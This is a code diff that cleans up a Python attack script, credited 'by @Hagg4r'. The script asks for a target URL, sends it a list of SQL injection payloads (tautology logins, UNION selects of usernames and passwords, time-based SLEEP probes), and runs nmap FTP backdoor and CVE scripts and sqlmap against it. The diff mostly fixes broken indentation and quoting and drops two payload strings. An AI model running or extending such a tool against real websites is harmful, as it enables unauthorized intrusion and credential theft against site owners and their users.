@@ -1,4 +1,6 @@
-print("by @Hagg4r")                                                                                              import os
+print("by @Hagg4r")                                                                                             
+
+import os
 import subprocess
 import requests
 from requests.exceptions import RequestException, SSLError
@@ -112,8 +114,6 @@ def perform_sql_injection(target_url, results_dir):
         "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
         "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
         "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-        "SELECT * FROM products WHERE name LIKE '%...WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
         "SELECT * FROM products WHERE name LIKE '%user_input%';",
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
@@ -172,29 +172,41 @@ def perform_sqlmap_scan(target_url, results_dir):
 def perform_ftp_scan(target_url, results_dir):
     """Perform an FTP scan on the target URL."""
     global file_count  # Declare file_count as global
-    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221”, target_url]
+    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221", target_url]
     try:
-    stdout, stderr = run_command(command)
-    output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
-    with open(output_file, 'w') as file:
-        file.write(stdout)
-    print(f"Saved FTP scan results to {output_file}")
-    file_count += 1
-except Exception as e:
-    print(f"An error occurred during FTP scan: {e}")
+        stdout, stderr = run_command(command)
+        output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
+        with open(output_file, 'w') as file:
+            file.write(stdout)
+        print(f"Saved FTP scan results to {output_file}")
+        file_count += 1
+    except Exception as e:
+        print(f"An error occurred during FTP scan: {e}")
+
+def access_seclists():
+    """Function to access seclists database (placeholder implementation)."""
+    # Implement the actual logic to access seclists as needed
+    # This is just a placeholder function
+    return "Seclists database accessed successfully."
+
+def main():
+    """Main function to orchestrate the security scans."""
+    global file_count
+    
     target_url = input("Enter the target URL: ")
-results_dir = input("Enter the results directory: ")
+    results_dir = input("Enter the results directory: ")
 
-if not os.path.exists(results_dir):
-    os.makedirs(results_dir)
+    if not os.path.exists(results_dir):
+        os.makedirs(results_dir)
 
-if check_website_status(target_url):
-    perform_sql_injection(target_url, results_dir)
-    perform_ftp_scan(target_url, results_dir)
-    perform_sqlmap_scan(target_url, results_dir)
-    seclists_db = access_seclists()
-    print(seclists_db)
-else:
-    print("The website is not accessible. Exiting...")
-    if name == “main”:
-main()
+    if check_website_status(target_url):
+        perform_sql_injection(target_url, results_dir)
+        perform_ftp_scan(target_url, results_dir)
+        perform_sqlmap_scan(target_url, results_dir)
+        seclists_db = access_seclists()
+        print(seclists_db)
+    else:
+        print("The website is not accessible. Exiting...")
+
+if __name__ == "__main__":
+    main()
